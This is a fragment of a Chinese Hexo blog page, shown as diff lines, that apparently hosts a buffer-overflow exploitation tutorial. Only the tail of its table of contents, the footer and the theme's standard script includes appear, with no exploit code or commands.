class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#剔除坏字符-bad-characters"><span class="nav-number">3.6.1.</span> <span class="nav-text">剔除坏字符(bad characters)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定位跳转地址"><span class="nav-number">3.6.2.</span> <span class="nav-text">定位跳转地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现控制"><span class="nav-number">3.7.</span> <span class="nav-text">实现控制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生成shellcode控制命令行"><span class="nav-number">3.7.1.</span> <span class="nav-text">生成shellcode控制命令行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#控制图形界面"><span class="nav-number">3.7.2.</span> <span class="nav-text">控制图形界面</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Alopex Cheung</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">231k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">6:25</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a>  v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+
+ <script async src="//dn-lbstatics.gbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script> 
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+<script>
+// GET RESPONSIVE HEIGHT PASSED FROM IFRAME
+
+window.addEventListener("message", function(e) {
+  var data = e.data;
+  if ((typeof data === 'string') && (data.indexOf('ciu_embed') > -1)) {
+    var featureID = data.split(':')[1];
+    var height = data.split(':')[2];
+    $(`iframe[data-feature=${featureID}]`).height(parseInt(height) + 30);
+  }
+}, false);
+</script>
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
